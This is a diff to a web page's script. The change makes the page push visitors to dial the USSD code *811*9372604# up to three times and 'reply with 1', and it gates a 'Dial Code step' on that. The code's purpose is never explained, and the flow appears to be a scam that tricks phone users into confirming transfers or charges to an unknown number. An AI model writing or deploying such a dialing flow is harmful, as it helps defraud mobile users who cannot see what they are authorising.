@@ -57,16 +57,43 @@
 
 <script>
 
+let dialClicks = 0;
+
+
 function dialNow(){
 
-    document.getElementById("dialStatus").innerHTML =
-    "Complete the USSD process and reply with 1.";
+    if(dialClicks < 3){
 
-    window.location.href="tel:*811*9372604%23";
+        dialClicks++;
+
+        document.getElementById("dialStatus").innerHTML =
+        "Complete the USSD process and reply with 1. Attempt " + dialClicks + " of 3.";
+
+        window.location.href="tel:*811*9372604%23";
+
+    } else {
+
+        document.getElementById("dialBtn").disabled = true;
+
+        document.getElementById("dialBtn").innerHTML =
+        "✅ Dial Completed";
+
+        alert("You have completed the Dial Code step.");
+
+    }
 
 }
 
+
 function completeDial(){
+
+    if(dialClicks === 0){
+
+        alert("Please tap Dial Code Now first.");
+
+        return;
+
+    }
 
     localStorage.setItem("dialCompleted","true");
 
@@ -74,7 +101,7 @@ function completeDial(){
 
 }
 
-</script>
+</script> 
 
 </body>
 </html>
